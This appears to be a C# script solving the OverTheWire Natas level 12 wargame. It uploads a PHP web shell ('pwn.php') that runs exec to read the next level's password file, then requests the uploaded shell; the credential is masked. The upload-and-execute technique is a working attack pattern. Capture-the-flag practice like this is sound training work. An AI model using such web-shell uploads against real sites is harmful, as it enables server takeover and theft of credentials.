using System.Net.Http;
using System.Text;

HttpClient client = new HttpClient();
client.BaseAddress = new Uri("http://natas12.natas.labs.overthewire.org");

//HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/index.php");
//HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/index-source.html");
//HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, "/index.php");

HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/upload/qbzewqonwl.php");

string credential = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes("natas12:???????????????????????????????????????"));
request.Headers.Add("Authorization", "Basic " + credential);
request.Headers.Add("ContentType", "multipart/form-data");

MultipartFormDataContent form = new MultipartFormDataContent();
ByteArrayContent fileContent = new ByteArrayContent(Encoding.UTF8.GetBytes("<? echo exec(\"cat /etc/natas_webpass/natas13\"); ?>"));
fileContent.Headers.Add("ContentType","text/plain");
form.Add(fileContent, "uploadedfile", "pwn.php");
form.Add(new StringContent("pwn.php"), name: "filename");
form.Add(new StringContent("1000"), name: "MAX_FILE_SIZE");

//request.Content = form;

HttpResponseMessage httpResponse = await client.SendAsync(request);
httpResponse.EnsureSuccessStatusCode();
String body = httpResponse.Content.ReadAsStringAsync().Result;
Console.WriteLine(body);
